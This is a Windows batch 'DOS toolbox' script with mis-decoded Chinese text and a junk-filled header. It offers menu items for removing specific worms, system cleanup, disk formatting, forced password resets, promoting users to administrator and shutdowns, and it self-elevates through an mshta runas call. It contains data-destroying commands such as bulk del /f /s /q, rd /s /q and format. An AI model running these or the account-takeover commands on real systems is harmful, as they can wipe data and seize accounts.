@goto chushihua
������ʣ������͂��������鲴������ꃤ�κ��y����뼘����ӗ�
�����@�Ѫp��������ࣚ��������v�����o��η�����l��䲗�����
���񃩝U�ЗL�^������ݒ������p�H�֛Ò�ȴ�������i���Iү����
�|�랚����ү�}�x�����Y���m�@�I�ؔ�����Z���֝������I���Ԓ�
���͔���̭���ؖ�����u��鲒��ʛ���쥔��럑�眂���L���t���
�ݘ��ⴶ䓯�N��ر�Β��������Ąm�ՠ��������G������ݞ�����
�Ҟ�����ү�ߞ���ۓ������a���Ɲp���ڕt������ⵤ�_���˅X��
ࡖ��W�Y�{��ס�K���Ԡ��[���źά�ִ���n�j̡����ئ���j�}��
������ʣ������͂��������鲴������ꃤ�κ��y����뼘����ӗ�
�����@�Ѫp��������ࣚ��������v�����o��η�����l��䲗�����
���񃩝U�ЗL�^������ݒ������p�H�֛Ò�ȴ�������i���Iү����
�|�랚����ү�}�x�����Y���m�@�I�ؔ�����Z���֝������I���Ԓ�
���͔���̭���ؖ�����u��鲒��ʛ���쥔��럑�眂���L���t���
�ݘ��ⴶ䓯�N��ر�Β��������Ąm�ՠ��������G������ݞ�����
�Ҟ�����ү�ߞ���ۓ������a���Ɲp���ڕt������ⵤ�_���˅X��
ࡖ��W�Y�{��ס�K���Ԡ��[���źά�ִ���n�j̡����ئ���j�}��

:chushihua
@if not "%os%" == "Windows_NT" goto winnt
@echo off&title ��&setlocal enabledelayedexpansion
if /i "%1" equ "ks" (goto ks)
if /i "!systemdrive!" equ "x:" (goto ks)
if exist "!windir!\system32\fltmc.exe" (
	>nul 2>nul fltmc&&goto ks
) else (
	goto ks
)
if exist "!localappdata!\Microsoft\WindowsApps\wt.exe" (call :stwt) else (call :stcmd)
rem ��Ȩ�����������Ԥ���������������ʼ���ٶ�
if exist "!temp!\dos_reading_cache.tmp" (
	>nul type "!temp!\dos_reading_cache.tmp"
) else (
	if exist "!windir!\system32\wbem\wmic.exe" (
		>"!temp!\dos_reading_cache.tmp" wmic os get caption /value
		>>"!temp!\dos_reading_cache.tmp" wmic path Win32_SystemEnclosure get ChassisTypes /value
	)
)
exit 0
:stwt
start /min mshta vbscript:createobject("shell.application").shellexecute("wt","%~dpnx0 ks","","runas",1)(window.close)
rem >nul 2>nul start /min powershell -mta -nologo start-process -filepath "wt" -argumentlist '"%~dpnx0" ks' -verb runas
goto :eof
:stcmd
start /min mshta vbscript:createobject("shell.application").shellexecute("%~dpnx0","ks","","runas",1)(window.close)
rem >nul 2>nul start /min powershell -mta -nologo start-process -filepath "!comspec!" -argumentlist '/c "%~dpnx0" ks' -verb runas
goto :eof
:ks
(
setlocal
set "dosqssj=!time!"
>nul chcp 936
set ver=20250601
set versize=154120
set xz0=0
set nx1=[+]��һҳ
set nx2=[-]��һҳ
set hx=echo;_______________________________________________________________________________
set "pause=<nul set /p "=�����������"&>nul pause"
if exist "!temp!\dos_reading_cache.tmp" (
	for /f "delims=" %%a in ('type "!temp!\dos_reading_cache.tmp"') do (
		>nul 2>nul set "%%a"
	)
) else (
	if exist "!windir!\system32\wbem\wmic.exe" (
		for /f "tokens=2 delims==" %%a in ('"2>nul wmic os get caption /value"') do (
			set "caption=%%a"
			set "caption=!caption:~0,-1!"
		)
		for /f "tokens=2 delims={}" %%a in ('"2>nul wmic path Win32_SystemEnclosure get ChassisTypes /value"') do (
			set "chassistypes={%%a}"
		)
	)
)
for /f "tokens=3" %%a in ("!caption!") do (
	2>nul call :pd%%a||(
		if /i "!systemdrive!" equ "x:" (set "system= - Windows PE") else (set "system= - !caption:~10!")
	)
	set caption=
)
if "!chassistypes!" neq "{3}" (
	if "!chassistypes!" neq "{1}" (
		set nx1=[S]��һҳ
		set nx2=[A]��һҳ
	)
)
set chassistypes=
for /f "tokens=3 delims=.]" %%a in ('ver') do (
	if %%a lss 10586 (set winv=1) else (set winv=0)
)
for /f %%a in ('"echo;prompt $E|cmd"') do (
	set "cswz=%%a["
	set "cswz1=%%a"
)
if exist "!windir!\system32\choice.exe" (
	set "sel=call :choice"
) else (
	set "sel=call :set"
)
call :list
)
:memuv2
title DOS������!system!
cls
set color=
set color1=f
set /a "color=!random!%%5"
if "!color!" equ "0" (
	set ysbak=40;97m
) else (
	if "!color!" equ "1" (
		set ysbak=44;97m
	) else (
		if "!color!" equ "2" (
			set color=5
			set ysbak=45;97m
		) else (
			if "!color!" equ "3" (
				set ysbak=46;97m
			) else (
				if "!color!" equ "4" (
					set color=7
					set color1=8
					set ysbak=47;90m
				)
			)
		)
	)
)
if "!winv!" equ "0" (set "fy=!cswz!!ysbak:~0,3!91m_!cswz!!ysbak!!cswz!!ysbak:~0,3!92m_!cswz!!ysbak!!cswz!!ysbak:~0,3!93m_!cswz!!ysbak!")
color !color!!color1!
if !start! lss 1 (set start=1)
if not defined a!start! (
	set /a "start=maxa-maxa/9*9"
	if "!start!" equ "0" (
		set /a "start=maxa-8"
	) else (
		set /a "start=maxa/9*9+1"
	)
)
set /a "end=start+8"
set /a "memuys=start/9+1"
if "!winv!" equ "0" (
	echo;				�˵� - ��!cswz!!ysbak:~0,3!92m!memuys!!cswz!!ysbak!ҳ
) else (
	echo;				�˵� - ��!memuys!ҳ
)
for /f "delims=. " %%a in ("!time!") do (echo;������ !date! %%a)
call :memuv2.2
set xx=0
for /l %%a in (!start!,1,!end!) do (
	set /a "xx+=1"
	if defined a%%a (
		set "xz!xx!=%%a"
		echo;[!xx!]!a%%a!
	) else (
		set xz!xx!=
	)
)
set /a "pd=end+1"
if defined a!pd! (
	set /a "pd=start-1"
	if !pd! lss 1 (
		if "!winv!" equ "0" (
			echo;[0]�˳�								!cswz!42;97m!nx1!!cswz!!ysbak!
		) else (
			echo;[0]�˳�								!nx1!
		)
	) else (
		if "!winv!" equ "0" (
			echo;[0]�˳�						!cswz!42;97m!nx1!	!nx2!!cswz!!ysbak!
		) else (
			echo;[0]�˳�						!nx1!	!nx2!
		)
	)
) else (
	if "!winv!" equ "0" (
		echo;[0]�˳�								!cswz!42;97m!nx2!!cswz!!ysbak!
	) else (
		echo;[0]�˳�								!nx2!
	)
)
call :memuv2.2
set caidan=
set /p "caidan=���������ѡ��: "
if not defined caidan (goto memuv2.1)
call :var caidan
if "!caidan:~1!" equ "" (
	if defined xz!caidan! (goto !xz%caidan%!)
	for %%a in (- a) do (
		if "!caidan!" equ "%%~a" (
			set /a "pd=start-1"
			if !pd! geq 1 (
				set /a "start-=9"
				goto memuv2
			) else (
				goto memuv2.1
			)
		)
	)
	for %%a in (+ s) do (
		if "!caidan!" equ "%%~a" (
			set /a "pd=end+1"
			if defined a!pd! (
				set /a "start+=9"
				goto memuv2
			) else (
				goto memuv2.1
			)
		)
	)
)
if /i "!caidan:~0,2!" equ "go" (
	set "caidan=!caidan:~2!"
	call :checkvar caidan num||(
		set /a "start=caidan*9-8"
		goto memuv2
	)
	goto memuv2.1
)
if defined !caidan! (goto !%caidan%!)
:memuv2.1
<nul set /p "=��������ȷ��ѡ�"
call :out 2
goto memuv2
:memuv2.2
if "!winv!" equ "0" (
	if defined fyacs (
		echo;!fya!
		set fyacs=
		set fya=
	) else (
		for /l %%a in (1,1,26) do (set "fya=!fya!!fy!")
		echo;!fya!
		set /a "fyacs+=1"
	)
) else (
	%hx%
)
goto :eof
:0
exit 0
:1
setlocal
title ���U�����lpk.dll����!system!
cls
echo;���������ʼ���lpl.dll����&>nul pause
cls
echo;�����������ƶ�����...
call :sypf sypf
for %%a in (!sypf!) do (
	for /f "tokens=2 delims=- " %%b in ('fsutil fsinfo drivetype %%a') do (
		if "%%b" equ "���ƶ�������" (
			for /f "delims=" %%b in ('dir /a /s /b %%alpk.dll') do (
				if "%%~zb" equ "44032" (
					attrib -s -h -r "%%b"
					del /f /q "%%b"&&echo;��ɾ��%%b
				)
			)
		)
	)
)
%hx%
echo;������
%pause%
endlocal
goto memuv2
:2
setlocal
title ���U�����jwgkvsq.vmx�����������߸ò���!system!
cls
echo;���������ʼ���jwgkvsq.vmx����&>nul pause
cls
echo;�����������ƶ�����...
call :sypf sypf
for %%a in (!sypf!) do (
	for /f "tokens=2 delims=- " %%b in ('fsutil fsinfo drivetype %%a') do (
		if "%%b" equ "���ƶ�������" (
			call :isntfs %%a||call :wjqx "%%aautorun.inf"
			call :isrefs %%a||call :wjqx "%%aautorun.inf"
			call :isntfs %%a||call :wjqx "%%aRECYCLER"
			call :isrefs %%a||call :wjqx "%%aRECYCLER"
			attrib -s -h -r "%%aautorun.inf"
			attrib -s -h -r "%%aRECYCLER"
			del /f /q "%%aautorun.inf"
			rd /s /q "%%aRECYCLER"
			del /f /q "%%aRECYCLER"
		)
	)
)
%hx%
%pause%
endlocal
goto memuv2
:3
setlocal
title ����ϵͳ����!system!
cls
set sc=delasd123
set scw=rdasd123
%sc:~0,3% /f%ad% /s /%ad%q %systemdrive%\*.tm%ad%p;^
						%systemdrive%\*log.txt;^
						%systemdrive%\*.dmp;^
						%systemdrive%\*.log;^
						%systemdrive%\*.gid;^
						%systemdrive%\*.chk;^
						%systemdrive%\*.old;^
						%systemdrive%\recycled\*.*;^
						%windir%\*.bak;^
						%windir%\prefetch\*.*;^
						%userprofile%\cookies\*.*;^
						"%userprofile%\Local Settings\Temporary Internet Files\*.*";^
						"%userprofile%\Local Settings\Temp\*.*";^
						"%userprofile%\recent\*.*";^
						%systemdrive%\*._mp;^
						%systemdrive%\~*.*
%scw:~0,2% /s /q %windir%\temp
md %windir%\temp
goto 3.1
%sc:~0,3% /f%ad% /s /%ad%q %systemdrive%\*.syd;^
						%systemdrive%\*.spc;^
						%systemdrive%\*.cdr_;^
						%systemdrive%\*.#res;^
						%systemdrive%\*.---;^
						%systemdrive%\*.$$$^
						%systemdrive%\*.@@@;^
						%systemdrive%\*.??$;^
						%systemdrive%\*.??~;^
						%systemdrive%\*.~*;^
						%systemdrive%\mscreate.dir;^
						%systemdrive%\chklist.*;^
						%systemdrive%\*.ftg;^
						%systemdrive%\*.fts;^
						%systemdrive%\*.err;^
						%systemdrive%\*.prv;^
						%systemdrive%\*.ms;^
						%systemdrive%\*.wbk;^
						%systemdrive%\*.xlk;^
						%systemdrive%\*.diz
:3.1
%hx%
echo;�������
%pause%
endlocal
goto memuv2
:4
title ��ʾϵͳ��Ϣ!system!
cls
systeminfo
mode
%hx%
%pause%
goto memuv2
:5
title ������������������!system!
cls
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskmgr /t reg_dword /d 00000000 /f
%hx%
%pause%
goto memuv2
:6
title ��ʾ�������ļ�(���˸��ಡ����)!system!
cls
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL" /v CheckedValue /t reg_dword /d 00000001 /f
%hx%
%pause%
goto memuv2
:7
title ���ע�������!system!
cls
call :16.5
%hx%
%pause%
goto memuv2
:8
setlocal
title ���㿪ƽ��!system!
cls
set /p "s=���뱻��ƽ������: "
call :checkvar s num&&goto 8.1
set /p "w=��ȷ��С�����λ��: "
call :checkvar w num&&goto 8.1
call :sqrt !s! !w! jg
cls
echo;!s!�Ŀ�ƽ�������(��ȷ��С�����!w!λ): !jg!
%hx%
%pause%
endlocal
goto memuv2
:8.1
<nul set /p "=��Ч����"
call :out 2
endlocal
goto 8
:9
setlocal
title ������ʾ��!system!
for /f "delims=" %%a in ('hostname') do (set "hostname=%%a")
cls
ver
if "!winv!" equ "0" (
	cmd /k prompt !cswz!!ysbak:~0,3!92m%username%!cswz!!ysbak!@%hostname%:$p#$s
) else (
	cmd /k prompt %username%@%hostname%:$p#$s
)
endlocal
goto memuv2
:10
setlocal
title �����̸�ʽת��ΪNTFS!system!
cls
%hx%
call :sypf sypf
echo;!sypf!
%hx%
echo;�����������ת������ʹ�ô��̴����޸�
set zhuanhuancipan=
set /p "zhuanhuancipan=������Ҫת�����̷�: "
call :var zhuanhuancipan
cls
convert !zhuanhuancipan!: /fs:ntfs /v /x
%hx%
%pause%
endlocal
goto memuv2
:11
setlocal
title �����޸�!system!
cls
%hx%
call :sypf sypf
echo;!sypf!
%hx%
set cipanxioufu=
set /p "cipanxioufu=������Ҫ�޸����̷�: "
call :var cipanxioufu
cls
call :isntfs !cipanxioufu!:
if errorlevel 1 (
	chkdsk /x /f /sdcleanup !cipanxioufu!:
) else (
	chkdsk /f /x !cipanxioufu!:
)
%hx%
echo;�޸����
%pause%
endlocal
goto memuv2
:12
setlocal
color cf
title ��ʽ��!system!
call :bel
cls
set geshihuaxuanxiang=
set /p "geshihuaxuanxiang=��ʽ����һ����Σ���ԣ��Ƿ����(y/n): "
call :var geshihuaxuanxiang
if /i "!geshihuaxuanxiang!" equ "y" (goto 12.1)
if /i "!geshihuaxuanxiang!" equ "n" (endlocal&goto memuv2)
<nul set /p "=��������ȷ��ѡ�"
call :out 2
endlocal
goto 12
:12.1
cls
%hx%
call :sypf sypf
echo;!sypf!
%hx%
set geshihua=
set /p "geshihua=������Ҫ��ʽ�����̷�: "
call :var geshihua
cls
if defined geshihua (
	if exist "!geshihua!:\" (
		label /mp !geshihua!: format&&format !geshihua!: /x /q /v:format /y
	)
)
%hx%
%pause%
endlocal
goto memuv2
:13
setlocal
title DOS������!system!
cls
%hx%
echo;ע��:DOS����ֻ�ܽ����������㣬������ֻ�ܾ�ȷ������
echo;��Ч��ֵ��Χ(-2147483648��2147483647)(c=���� e=����)
%hx%
:13.1
set biaodashi=
set /p "biaodashi=������ʽ: "
call :var biaodashi
if /i "!biaodashi!" equ "c" (endlocal&goto 13)
if /i "!biaodashi!" equ "e" (endlocal&goto memuv2)
set /a "jieguo=!biaodashi!"
echo;������:!biaodashi!=!jieguo!
%hx%
goto 13.1
:14
title ���������ʾ��������!system!
cls
reg add "HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System" /v DisableCMD /t reg_dword /d 00000000 /f
%hx%
%pause%
goto memuv2
:15
setlocal
title �����������!system!
set cs=0
cls
echo;˵��:ֻ�������������������Χ(0-32767)(e=���ز˵�)
%hx%
set zuidazhi=
set zuixiaozhi=
set /p "zuidazhi=��������������ֵ: "
set /p "zuixiaozhi=�������������Сֵ: "
call :var zuidazhi
call :var zuixiaozhi
%hx%
:15.1
set /a "cs+=1"
set /a "zdzcl=zuidazhi+1"
set /a "suijishu=!random!%%(zdzcl-zuixiaozhi)+zuixiaozhi"
echo;��!cs!�β����������: !suijishu!
set tuichusuijishu=
set /p tuichusuijishu=
if /i "!tuichusuijishu!" equ "e" (endlocal&goto memuv2)
goto 15.1
:16
setlocal
title ���KHATRA����!system!
cls
echo;���������ʼ���KHATRT����&>nul pause
cls
echo;���ڽ���KHATRA��������...
:16.4.1
for /l %%a in (1,1,2) do (
	taskkill /f /im xplorer.exe
	attrib -s -h -r "!windir!\xplorer.exe"
	del /f /q "!windir!\xplorer.exe"
	md "!windir!\xplorer.exe"
	taskkill /f /im ghost.exe
	attrib -s -h -r "!windir!\system\ghost.exe"
	del /f /q "!windir!\system\ghost.exe"
	md "!windir!\system\ghost.exe"
	taskkill /f /im khatra.exe
	attrib -s -h -r "!windir!\system32\khatra.exe"
	del /f /q "!windir!\system32\khatra.exe"
	md "!windir!\system32\khatra.exe"
	attrib -s -h -r "%systemdrive%\khatra.exe"
	del /f /q "%systemdrive%\khatra.exe"
	md "%systemdrive%\khatra.exe"
)
echo;����ɾ��KHATRA����...
rd /s /q "%systemdrive%\khatra.exe";^
		"!windir!\xplorer.exe";^
		"!windir!\system\ghost.exe";^
		"!windir!\system32\khatra.exe";^
		"!windir!\k.backup";^
		"!windir!\system32\ntmsdata"
del /f /q "!windir!\youtube.cab";^
		"!windir!\supermodels.cab";^
		"!windir!\new-screamsaver.com.cab";^
		"!windir!\New WinZip File.cab";^
		"!windir!\New WinRAR ZIP archive.cab";^
		"!windir!\New WinRAR archive.cab";^
		"!windir!\mario675.cab";^
		"!windir!\kavSetupEng3857.cab";^
		"!windir!\fh_antivirussetup6534.cab";^
		"!windir!\CyberWar.cab";^
		"!windir!\khatarnakh.exe";^
		"!windir!\tasks\at1.job";^
		"!windir!\system32\avphost.dll";^
		"!windir!\inf\autoplay.inf"
echo;����ȫ��ɨ��...
call :sypf sypf
for /f "delims=" %%a in ('"for %%a in (!sypf!) do (dir /a /s /b %%a*.exe)"') do (
	if "%%~za" equ "486912" (
		attrib -s -h -r "%%a"
		del /f /q "%%a"
		echo;��ɾ��%%a
	)
)
for /f "delims=" %%a in ('"for %%a in (!sypf!) do (dir /a /s /b %%aautorun.inf)"') do (
	if "%%~za" equ "234" (
		attrib -s -h -r "%%a"
		del /f /q "%%a"
		echo;��ɾ��%%a
	)
)
for %%a in (!sypf!) do (del /f /s /q %%a(Empty).lnk)
call :16.5
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL" /v CheckedValue /t reg_dword /d 00000001 /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\Current Version\Policies\Explorer" /v nosetfolders /t reg_dword /d 00000000 /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoControlPanel /t reg_dword /d 00000000 /f
:16.1
%hx%
set zhucebiaoqingli=
set /p "zhucebiaoqingli=ע�����Ҫ�ֶ�����.�Ƿ��ע���(y/n):"
call :var zhucebiaoqingli
if /i "!zhucebiaoqingli!" equ "y" (goto 16.2)
if /i "!zhucebiaoqingli!" equ "n" (goto 16.3)
<nul set /p "=��������ȷ��ѡ�"
call :out 2
goto 16.1
:16.2
cls
regedit
:16.3
cls
echo;KHATRA����������
%pause%
endlocal
goto memuv2
:16.5
>!windir!\temp\reg.inf (
echo;[Version]
echo;Signature="$CHICAGO$"
echo;[DefaultInstall]
echo;DelReg=del
echo;[del]
echo;HKCU,Software\Microsoft\Windows\CurrentVersion\Policies\System,Disableregistrytools
)
rundll32 syssetup,SetupInfObjectInstallAction DefaultInstall 128 !windir!\temp\reg.inf
del /f /q !windir!\temp\reg.inf
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t reg_dword /d 00000000 /f
goto :eof
:17
start regedit
goto memuv2
:18
start control
goto memuv2
:19
start dxdiag
goto memuv2
:20
start compmgmt.msc
goto memuv2
:21
setlocal
title �û�����!system!
cls
%hx%
for %%a in (
	"[1]��ʾ���е��û�"
	"[2]�������û�"
	"[3]ɾ���û�"
	"[4]�����û�Ϊ����Ա"
	"[5]ǿ���޸��û�����"
	"[6]�鿴�û���Ϣ"
	"[7]�����˻�"
	"[8]ͣ���˻�"
	"[0]���ز˵�"
) do (
	echo;%%~a
)
%hx%
set cho=123456780
%sel% shuru
if "!shuru!" equ "1" (goto 21.1)
if "!shuru!" equ "2" (goto 21.2)
if "!shuru!" equ "3" (goto 21.3)
if "!shuru!" equ "4" (goto 21.4)
if "!shuru!" equ "5" (goto 21.5)
if "!shuru!" equ "6" (goto 21.6)
if "!shuru!" equ "7" (goto 21.7)
if "!shuru!" equ "8" (goto 21.8)
if "!shuru!" equ "9" (endlocal&goto memuv2)
if "!shuru!" equ "0" (endlocal&goto memuv2)
<nul set /p "=��������ȷ��ѡ�"
call :out 2
endlocal
goto 21
:21.1
title ��ʾ���е��û�!system!
cls
%hx%
net user
%hx%
echo;��ǰ�ѵ�¼���û�: !username!
%hx%
%pause%
endlocal
goto 21
:21.2
title �������û�!system!
cls
echo;ע��:�������û�����Ϊ��ͨ�û�
%hx%
net user
%hx%
echo;��ǰ�ѵ�¼���û�: !username!
%hx%
set xinyonghuming=
set xinyonghumima=
set /p "xinyonghuming=�û���: "
set /p "xinyonghumima=����: "
call :var xinyonghuming
call :var xinyonghumima
%hx%
cls
net user !xinyonghuming! !xinyonghumima! /add
%hx%
%pause%
endlocal
goto 21
:21.3
title ɾ���û�!system!
cls
%hx%
net user
%hx%
echo;��ǰ�ѵ�¼���û�: !username!
%hx%
set shanchuyonghu=
set /p "shanchuyonghu=����Ҫɾ�����û�: "
call :var shanchuyonghu
cls
net user !shanchuyonghu! /del
%hx%
%pause%
endlocal
goto 21
:21.4
title �����û�Ϊ����Ա!system!
cls
%hx%
net user
%hx%
echo;��ǰ�ѵ�¼���û�: !username!
%hx%
set tishengyonghu=
set /p "tishengyonghu=����Ҫ�������û���: "
call :var tishengyonghu
cls
net localgroup administrators !tishengyonghu! /add
%hx%
%pause%
endlocal
goto 21
:21.5
title ǿ���޸��û�����!system!
cls
%hx%
net user
%hx%
echo;��ǰ�ѵ�¼���û�: !username!
%hx%
set xiougaimima=
set xinmima=
set /p "xiougaimima=����Ҫ�޸ĵ��û���: "
set /p "xinmima=����������: "
call :var xiougaimima
call :var xinmima
cls
net user !xiougaimima! !xinmima!
%hx%
%pause%
endlocal
goto 21
:21.6
title �鿴�û���Ϣ!system!
cls
net user
%hx%
echo;��ǰ�ѵ�¼���û�: !username!
%hx%
set chakanyonghuxinxi=
set /p "chakanyonghuxinxi=����Ҫ�鿴���û���: "
call :var chakanyonghuxinxi
cls
net user !chakanyonghuxinxi!
%hx%
%pause%
endlocal
goto 21
:21.7
title �����˻�!system!
cls
net user
%hx%
echo;��ǰ�ѵ�¼���û�: !username!
%hx%
set jhzh=
set /p "jhzh=����Ҫ�������û���: "
call :var jhzh
cls
net user !jhzh! /active:yes
%hx%
%pause%
endlocal
goto 21
:21.8
title ͣ���˻�!system!
cls
net user
%hx%
echo;��ǰ�ѵ�¼���û�: !username!
%hx%
set tyzh=
set /p "tyzh=����Ҫ�������û���: "
call :var tyzh
cls
net user !tyzh! /active:no
%hx%
%pause%
endlocal
goto 21
:22
start gpedit.msc
goto memuv2
:guanji
setlocal
title �ػ�ѡ��!system!
color 0a
cls
%hx%
for %%a in (
	"[1]�ػ�"
	"[2]����"
	"[3]ע��"
	"[4]����ϵͳ�ػ�"
	"[5]�������߹���"
	"[6]�ر����߹���"
	"[7]��ʾϵͳ�Ͽ��õ�˯��״̬"
	"[8]����"
	"[9]ѭ����ʾ���Ѽ�ʱ�����Դ����"
	"[0]���ز˵�"
) do (
	echo;%%~a
)
%hx%
set cho=1234567890
%sel% shuru
if "!shuru!" equ "1" (goto guanji.1)
if "!shuru!" equ "2" (goto guanji.2)
if "!shuru!" equ "3" (goto guanji.3)
if "!shuru!" equ "4" (goto guanji.4)
if "!shuru!" equ "5" (goto guanji.6)
if "!shuru!" equ "6" (goto guanji.7)
if "!shuru!" equ "7" (goto guanji.8)
if "!shuru!" equ "8" (
	rem tsdiscon
	rundll32 user32.dll LockWorkStation
	endlocal
	goto guanji
)
if "!shuru!" equ "9" (goto guanji.9)
if "!shuru!" equ "10" (endlocal&goto memuv2)
if "!shuru!" equ "0" (endlocal&goto memuv2)
<nul set /p "=��������ȷ��ѡ�"
call :out 2
endlocal
goto guanji
:guanji.1
title �ػ�!system!
cls
set guanjidaojishi=
set /p "guanjidaojishi=���ùػ�����ʱ����Ч��Χ(0-315360000)��(e=����): "
call :var guanjidaojishi
if /i "!guanjidaojishi!" equ "e" (endlocal&goto guanji)
call :checkvar guanjidaojishi num&&(
	<nul set /p "=������Ч���֣�"
	call :out 2
	goto guanji.1
)
shutdown /s /f /t !guanjidaojishi!
endlocal
goto guanji
:guanji.2
title ����!system!
cls
set chongqidaojishi=
set /p "chongqidaojishi=������������ʱ����Ч��Χ(0-315360000)��(e=����): "
call :var chongqidaojishi
if "!chongqidaojishi!" equ "e" (endlocal&goto guanji)
call :checkvar chongqidaojishi num&&(
	<nul set /p "=������Ч���֣�"
	call :out 2
	goto guanji.2
)
shutdown /r /f /t !chongqidaojishi!
endlocal
goto guanji
:guanji.3
title ע��!system!
cls
set zhuxiao=
set /p "zhuxiao=�Ƿ�����ע��(y/n): "
call :var zhuxiao
if /i "!zhuxiao!" equ "y" (logoff&exit 0)
if /i "!zhuxiao!" equ "n" (endlocal&goto guanji)
<nul set /p "=��������ȷ��ѡ�"
call :out 2
goto guanji.3
:guanji.4
title ����ϵͳ�ػ�!system!
cls
shutdown /a
call :out 2
endlocal
goto guanji
:guanji.6
title ��������!system!
cls
set size=
set /p "size=���������ļ�ռ�����ڴ����(40~100)(Ĭ��100)(e=����): "
call :var size
if /i "!size!" equ "e" (endlocal&goto guanji)
call :checkvar size num&&(
	<nul set /p "=������Ч���֣�"
	call :out 2
	goto guanji.6
)
if !size! geq 40 (
	if !size! leq 100 (
		powercfg /h /size !size!
		<nul set /p "=�ѿ������߹���"
		call :out 2
		endlocal
		goto guanji
	)
)
:guanji.7
title �ر�����!system!
cls
powercfg -h off
<nul set /p "=�ѹر����߹���"
call :out 2
endlocal
goto guanji
:guanji.8
title ��ʾϵͳ�Ͽ��õ�˯��״̬!system!
cls
powercfg -a
%hx%
%pause%
endlocal
goto guanji
:guanji.9
title ѭ����ʾ���Ѽ�ʱ�����Դ����!system!
cls
powercfg /requests
powercfg /waketimers
%hx%
echo;��e���ز˵�
>nul choice /c 1e /t 1 /d 1
if "!errorlevel!" equ "2" (endlocal&goto guanji)
goto guanji.9
:23
setlocal
title DOS���������!system!
cls
%hx%
for %%a in (
	"[1]��ʾ���н���"
	"[2]��ʾÿ�����̵ķ���"
	"[3]��ʾ����·��"
	"[4]��ʾ������ϸ��Ϣ"
	"[5]��ʾ���̵�TCP/UDP����"
	"[6]ѭ����ʾCPUռ�����������ٶ�"
	"[0]���ز˵�"
) do (
	echo;%%~a
)
%hx%
set cho=1234560
%sel% shuru
if "!shuru!" equ "1" (goto 23.1)
if "!shuru!" equ "2" (goto 23.2)
if "!shuru!" equ "3" (goto 23.6)
if "!shuru!" equ "4" (goto 23.10)
if "!shuru!" equ "5" (goto 23.3)
if "!shuru!" equ "6" (goto 23.4)
if "!shuru!" equ "7" (endlocal&goto memuv2)
if "!shuru!" equ "0" (endlocal&goto memuv2)
<nul set /p "=��������ȷ��ѡ�"
call :out 2
endlocal
goto 23
:23.1
cls
tasklist
%hx%
set jcjs=
set /p "jcjs=����Ҫ�����Ľ���PID������(e=����)(f=ˢ��): "
call :var jcjs
if not defined jcjs (goto 23.1)
if /i "!jcjs!" equ "f" (goto 23.1)
if /i "!jcjs!" equ "e" (endlocal&goto 23)
taskkill /f /im !jcjs!
call :out 2
goto 23.1
:23.2
cls
tasklist /svc
%hx%
set jcjs=
set /p "jcjs=����Ҫ�����Ľ���PID������(e=����)(f=ˢ��): "
call :var jcjs
if not defined jcjs (goto 23.2)
if /i "!jcjs!" equ "f" (goto 23.2)
if /i "!jcjs!" equ "e" (endlocal&goto 23)
taskkill /f /im !jcjs!
call :out 2
goto 23.2
:23.6
title ��ʾ����·��!system!
cls
tasklist
%hx%
set jclj=
set /p "jclj=����Ҫ��ʾ�Ľ���PID(e=����)(f=ˢ��): "
call :var jclj
if not defined jclj (goto 23.6)
if /i "!jclj!" equ "f" (goto 23.6)
if /i "!jclj!" equ "e" (endlocal&goto 23)
for /f "tokens=2 delims=," %%a in ('tasklist /fi "pid eq !jclj!"/fo csv /nh') do (
	if "%%~a" neq "!jclj!" (
		<nul set /p "=û�д˽���"
		call :out 2
		goto 23.6
	)
)
cls
for /f "tokens=2 delims==" %%a in ('"2>nul wmic process where processid=!jclj! get executablepath /value"') do (
	set "jclj1=%%a"
	set "jclj1=!jclj1:~0,-1!"
)
echo;�ļ�·��: !jclj1!
%hx%
echo;(e=����)(d=���ļ�λ��)
set cho=ed
%sel% shuru
if "!shuru!" equ "1" (endlocal&goto 23)
if "!shuru!" equ "2" (goto 23.8)
if /i "!shuru!" equ "e" (endlocal&goto 23)
if /i "!shuru!" equ "d" (goto 23.8)
<nul set /p "=��������ȷ��ѡ�"
call :out 2
goto 23.6
:23.8
explorer /select,"!jclj1!"
endlocal
goto 23
:23.10
title ��ʾ������ϸ��Ϣ!system!
cls
%hx%
tasklist
%hx%
set jclj=
set /p "jclj=����Ҫ��ʾ�Ľ���PID(e=����)(f=ˢ��): "
call :var jclj
if not defined jclj (goto 23.10)
if /i "!jclj!" equ "f" (goto 23.10)
if /i "!jclj!" equ "e" (endlocal&goto 23)
for /f "tokens=2 delims=," %%a in ('tasklist /fi "pid eq !jclj!" /fo csv /nh') do (
	if "%%~a" neq "!jclj!" (
		<nul set /p "=û�д˽���"
		call :out 2
		goto 23.10
	)
)
cls
%hx%
for /f "delims=" %%a in ('"2>nul wmic process where processid=!jclj! get * /value"') do (
	set "var=%%a"
	set "var=!var:~0,-1!"
	>nul 2>nul set "!var!"
)
if defined name (echo;����:		!name!)
if defined parentprocessid (echo;��ϵPID:	!parentprocessid!)
if defined threadCount (echo;�߳���:		!threadCount!)
if defined handlecount (echo;�����:		!handlecount!)
if defined workingsetsize (
	call :xdwjs !workingsetsize! zj workingsetsize
	echo;��������С:	!workingsetsize!
)
if defined pagefileusage (
	call :xdwjs !pagefileusage! kb pagefileusage
	echo;ҳ���ļ�ʹ��:	!pagefileusage!
)
if defined creationdate (echo;������������:	!creationdate:~0,4!��!creationdate:~4,2!��!creationdate:~6,2!�� !creationdate:~8,2!:!creationdate:~10,2!:!creationdate:~12,2!)
if defined priority (echo;���ȼ�:		!priority!)
if defined sessionid (echo;�ỰID:		!sessionid!)
if defined readoperationcount (echo;��ȡ������:	!readoperationcount!)
if defined readtransfercount (
	call :xdwjs !readtransfercount! zj readtransfercount
	echo;��ȡ������:	!readtransfercount!
)
if defined writeoperationcount (echo;д�������:	!writeoperationcount!)
if defined writetransfercount (
	call :xdwjs !writetransfercount! zj writetransfercount
	echo;д�봫����:	!writetransfercount!
)
if defined executablepath (echo;·��:		!executablepath!)
if defined commandline (
	echo;������:		!commandline!
) else (
	wmic process where processid=!jclj! get commandline
)
